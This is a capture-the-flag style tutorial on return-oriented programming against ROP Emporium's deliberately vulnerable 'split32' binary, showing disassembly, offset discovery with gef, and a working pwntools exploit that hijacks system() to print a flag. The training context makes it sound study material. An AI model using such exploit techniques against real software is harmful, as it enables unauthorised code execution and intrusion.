# Return Oriented Programming


ROP is a technique used to bypass the non-executable stack while using the available gadgets from the associated binaries i.e. opcodes ending with `ret`. See "tools". 

> `split` -32bit binary from ROP Emporium is used to demonstrate the ROP technique.



```r
d4mianwayne@oracle:~/Pwning/fun$ checksec split32
[*] '/home/d4mianwayne/Pwning/fun/split32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
 Partial
gef➤  
```

It has `NX` enabled i.e. no shellcode execution, so we will use Return Oriented Programming technique to get a shell. Let's reverse engineer it first:-

Using `radare2` to disassemble the binary and then checking the functions:-

```r
d4mianwayne@oracle:~/Pwning/fun$ r2 -AAAAA split32
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x08048480]> afl
0x08048000    6 418  -> 423  fcn.eip
0x080481a2   32 577  -> 587  fcn.080481a2
0x080483c0    3 35           sym._init
0x080483e3    1 25           fcn.080483e3
0x080483fc    1 4            sub.printf_12_3fc
0x08048400    1 6            sym.imp.printf
0x08048410    1 6            sym.imp.fgets
0x08048420    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.system
0x08048440    1 6            sym.imp.__libc_start_main
0x08048450    1 6            sym.imp.setvbuf
0x08048460    1 6            sym.imp.memset
0x08048470    1 6            sub.__gmon_start___252_470
0x08048480    1 33           entry0
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080484c0    4 43           sym.deregister_tm_clones
0x080484f0    4 53           sym.register_tm_clones
0x08048530    3 30           sym.__do_global_dtors_aux
0x08048550    4 43   -> 40   entry1.init
0x0804857b    1 123          sym.main
0x080485f6    1 83           sym.pwnme
0x08048649    1 25           sym.usefulFunction
0x08048670    4 93           sym.__libc_csu_init
0x080486d0    1 2            sym.__libc_csu_fini
0x080486d4    1 20           sym._fini
[0x08048480]> 
```



Here we can use we have three functions of interest, one being `main`, second being `sym.pwnme` and remaining one being `sym.usefulFunction`. Let's check the disassembly of these functions and then see what can we do:-

```r
[0x08048480]> pdf @main
            ;-- main:
/ (fcn) sym.main 123
|   sym.main ();
|           ; var int local_4h_2 @ ebp-0x4
|           ; var int local_4h @ esp+0x4
|              ; DATA XREF from 0x08048497 (entry0)
|           0x0804857b      8d4c2404       lea ecx, dword [local_4h]   ; 4
|           0x0804857f      83e4f0         and esp, 0xfffffff0
|           0x08048582      ff71fc         push dword [ecx - 4]
|           0x08048585      55             push ebp
|           0x08048586      89e5           mov ebp, esp
|           0x08048588      51             push ecx
|           0x08048589      83ec04         sub esp, 4
|           0x0804858c      a184a00408     mov eax, dword [obj.stdout] ; [0x804a084:4]=0
|           0x08048591      6a00           push 0
|           0x08048593      6a02           push 2                      ; 2
|           0x08048595      6a00           push 0                      ; size_t size
|           0x08048597      50             push eax                    ; int mode
|           0x08048598      e8b3feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
|           0x0804859d      83c410         add esp, 0x10
|           0x080485a0      a160a00408     mov eax, dword [obj.stderr] ; [0x804a060:4]=0
|           0x080485a5      6a00           push 0
|           0x080485a7      6a02           push 2                      ; 2
|           0x080485a9      6a00           push 0                      ; size_t size
|           0x080485ab      50             push eax                    ; int mode
|           0x080485ac      e89ffeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
|           0x080485b1      83c410         add esp, 0x10
|           0x080485b4      83ec0c         sub esp, 0xc
|           0x080485b7      68f0860408     push str.split_by_ROP_Emporium ; 0x80486f0 ; "split by ROP Emporium" ; const char * s
|           0x080485bc      e85ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485c1      83c410         add esp, 0x10
|           0x080485c4      83ec0c         sub esp, 0xc
|           0x080485c7      6806870408     push str.32bits             ; 0x8048706 ; "32bits\n" ; const char * s
|           0x080485cc      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485d1      83c410         add esp, 0x10
|           0x080485d4      e81d000000     call sym.pwnme
|           0x080485d9      83ec0c         sub esp, 0xc
|           0x080485dc      680e870408     push str.Exiting            ; 0x804870e ; "\nExiting" ; const char * s
|           0x080485e1      e83afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485e6      83c410         add esp, 0x10
|           0x080485e9      b800000000     mov eax, 0
|           0x080485ee      8b4dfc         mov ecx, dword [local_4h_2]
|           0x080485f1      c9             leave
|           0x080485f2      8d61fc         lea esp, dword [ecx - 4]

```
So, here `main` is setting up the buffer and calling `sym.pwnme`, let's check the disassembly of it:-

```t
[0x08048480]> pdf @sym.pwnme
/ (fcn) sym.pwnme 83
|   sym.pwnme ();
|           ; var int local_28h @ ebp-0x28
|              ; CALL XREF from 0x080485d4 (sym.main)
|           0x080485f6      55             push ebp
|           0x080485f7      89e5           mov ebp, esp
|           0x080485f9      83ec28         sub esp, 0x28               ; '('
|           0x080485fc      83ec04         sub esp, 4
|           0x080485ff      6a20           push 0x20                   ; 32
|           0x08048601      6a00           push 0                      ; size_t n
|           0x08048603      8d45d8         lea eax, dword [local_28h]
|           0x08048606      50             push eax                    ; int c
|           0x08048607      e854feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x0804860c      83c410         add esp, 0x10
|           0x0804860f      83ec0c         sub esp, 0xc
|           0x08048612      6818870408     push str.Contriving_a_reason_to_ask_user_for_data... ; 0x8048718 ; "Contriving a reason to ask user for data..." ; const char * s
|           0x08048617      e804feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804861c      83c410         add esp, 0x10
|           0x0804861f      83ec0c         sub esp, 0xc
|           0x08048622      6844870408     push 0x8048744              ; const char * format
|           0x08048627      e8d4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804862c      83c410         add esp, 0x10
|           0x0804862f      a180a00408     mov eax, dword [obj.stdin]  ; [0x804a080:4]=0
|           0x08048634      83ec04         sub esp, 4
|           0x08048637      50             push eax
|           0x08048638      6a60           push 0x60                   ; '`' ; 96
|           0x0804863a      8d45d8         lea eax, dword [local_28h]
|           0x0804863d      50             push eax                    ; char *s
|           0x0804863e      e8cdfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048643      83c410         add esp, 0x10
|           0x08048646      90             nop
|           0x08048647      c9             leave
\           0x08048648      c3             ret
[0x08048480]> 
```


Here, it is calling `fgets` which is taking 96 bytes which is more than the buffer allocated for the input, hence a buffer overflow vulnerability.

```r
[0x08048480]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 25
|   sym.usefulFunction ();
|           0x08048649      55             push ebp
|           0x0804864a      89e5           mov ebp, esp
|           0x0804864c      83ec08         sub esp, 8
|           0x0804864f      83ec0c         sub esp, 0xc
|           0x08048652      6847870408     push str.bin_ls             ; 0x8048747 ; "/bin/ls" ; const char * string
|           0x08048657      e8d4fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0804865c      83c410         add esp, 0x10
|           0x0804865f      90             nop
|           0x08048660      c9             leave
\           0x08048661      c3             ret
```

This function seems to be just doing `system("/bin/ls")` when called.

Let's check if this binary has any useful strings, let's check it in `radare`:-

```r
[0x08048480]> izzq~bin
0x8048747 8 7 /bin/ls
0x804a030 18 17 /bin/cat flag.txt
```
>izzq~<str> is used to find the address of a the strings which matches the pattern given.

---

### Attacking Plan


Now, we know it has a buffer overflow vulnerability and it contains `system` function which makes things easier. Secondly, it has a string `/bin/cat flag.txt`. So, which means we can do:-

```s
--------------------------------------------------------------
| buffer to EIP | system@plt | dummy_ret  | useful_string    |
--------------------------------------------------------------
```

---


Like, in 64bit we need to register to pass arguments, the 32bit calling convention differs, which means the function take parameters from stack. Due to this we have appended the useful string at the end of payload, which would be pushe dt stack and when system is called, it'll look for a string, hence executing the command.

### Finding offsets

Using `gdb`-'s extension plugin named `gef` we will create a cyclic buffer which will given as input, making it easier to get the offset.

```r
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/d4mianwayne/Pwning/fun/split32 
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]


-- snip --

[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split32", stopped 0x6161616c in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x6161616c in ?? ()
gef➤  pattern search laaa
[+] Searching 'laaa'
[+] Found at offset 41 (little-endian search) likely
[+] Found at offset 44 (big-endian search) 
gef➤  x/s $eip
0x6161616c:	<error: Cannot access memory at address 0x6161616c>
gef➤  pattern search 0x6161616c
[+] Searching '0x6161616c'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search) 

```

### Payload

The payload, as discussed earlier would be:-

```r
--------------------------------------------------------------
| buffer to EIP | system@plt | dummy_ret  | useful_string    |
--------------------------------------------------------------
```

Then in python, it'll look like:-

Let's craft the exploit:-

```python

payload = b"A"*44
payload += p32(0x08048430) # Address of `system`
payload += p32(0xdeadbeef) # dummy `ret`
payload += p32(0x804a030) # Address of `/bin/cat flag.txt`
```

### Pwning Time

Now, our exploit looks like:-

```python
from pwn import *

p = process("./split32") # Starting process

payload = b"A"*44
payload += p32(0x08048430) # Address of `system`
payload += p32(0xdeadbeef) # dummy `ret`
payload += p32(0x804a030) # Address of `/bin/cat flag.txt`
p.sendlineafter(b"> ", payload) # Sending the payload after `> ` 
p.interactive() # Switch to interactive()
```

Running the exploit:-

```r
d4mianwayne@oracle:~/Pwning/fun$ python3 split32.py 
[+] Starting local process './split32': pid 5333
[*] Switching to interactive mode
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
[*] Process './split32' stopped with exit code -11 (SIGSEGV) (pid 5333)
[*] Got EOF while sending in interactive
d4mianwayne@oracle:~/Pwning/fun$ cat flag.txt 
ROPE{a_placeholder_32byte_flag!}
```


**Done!**
